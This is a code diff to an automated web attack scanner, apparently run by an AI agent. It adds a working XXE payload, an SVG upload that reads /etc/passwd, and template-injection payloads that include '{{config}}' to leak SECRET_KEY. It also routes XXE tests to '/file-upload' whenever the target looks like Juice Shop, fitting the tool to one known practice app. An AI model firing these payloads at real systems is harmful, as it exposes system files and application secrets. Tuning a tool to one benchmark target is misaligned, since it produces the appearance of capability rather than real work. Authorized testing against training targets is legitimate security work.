@@ -468,7 +468,10 @@ Based on reconnaissance findings, CONSTRUCT optimal tool commands:
                     elif test_type == 'lfi':
                         await self._execute_lfi_test(url, parameters, all_findings, auth_data)
                     elif test_type == 'xxe':
-                        await self._execute_xxe_test(url, all_findings, auth_data)
+                        xxe_url = url
+                        if "3000" in (self.target or "") or "juice" in (self.target or "").lower():
+                            xxe_url = self.target.rstrip("/") + "/file-upload"
+                        await self._execute_xxe_test(xxe_url, all_findings, auth_data)
                     elif test_type == 'ssrf':
                         await self._execute_ssrf_test(url, all_findings, auth_data)
                     elif test_type == 'ssti':
@@ -497,10 +500,13 @@ Based on reconnaissance findings, CONSTRUCT optimal tool commands:
                 if (ep.get("params") or ep.get("query_parameters") or "?" in (ep.get("url") or ep.get("path") or ""))
             ][:15]
             _ssti_payloads = [
-                ("{{8675309*9999991}}", "86753011922219"),
-                ("${8675309*9999991}", "86753011922219"),
-                ("<%= 8675309*9999991 %>", "86753011922219"),
-                ("#{8675309*9999991}", "86753011922219"),
+                ("{{7*7}}", "49"),
+                ("${7*7}", "49"),
+                ("<%= 7*7 %>", "49"),
+                ("#{7*7}", "49"),
+                ("*{7*7}", "49"),
+                ("{{7*'7'}}", "7777777"),
+                ("{{config}}", "SECRET_KEY"),
             ]
             async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as _ssti_client:
                 for ep in _candidates:
@@ -1033,6 +1039,26 @@ Based on reconnaissance findings, CONSTRUCT optimal tool commands:
                     "details": data.get("message", "XXE detected")
                 })
                 self.log("info", f"      ✓ XXE found!")
+
+        # SVG file upload XXE (Juice Shop / any app with file upload)
+        try:
+            xxe_svg = b'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'''
+            import httpx as _httpx_xxe
+            files = {"file": ("xxe.svg", xxe_svg, "image/svg+xml")}
+            _headers = {}
+            if auth_data and auth_data.get("token"):
+                _headers["Authorization"] = f"Bearer {auth_data['token']}"
+            async with _httpx_xxe.AsyncClient(verify=False, timeout=20) as _c:
+                r = await _c.post(url, files=files, headers=_headers)
+                if "root:" in r.text or "/bin/bash" in r.text or "xxe" in r.text.lower():
+                    all_findings.setdefault("xxe", []).append({
+                        "url": url, "technique": "SVG file upload XXE",
+                        "evidence": r.text[:300]
+                    })
+        except Exception:
+            pass
 
     async def _execute_ssrf_test(self, url: str, all_findings: dict, auth_data: dict = None):
         """Execute SSRF test — uses discovered endpoints when available."""
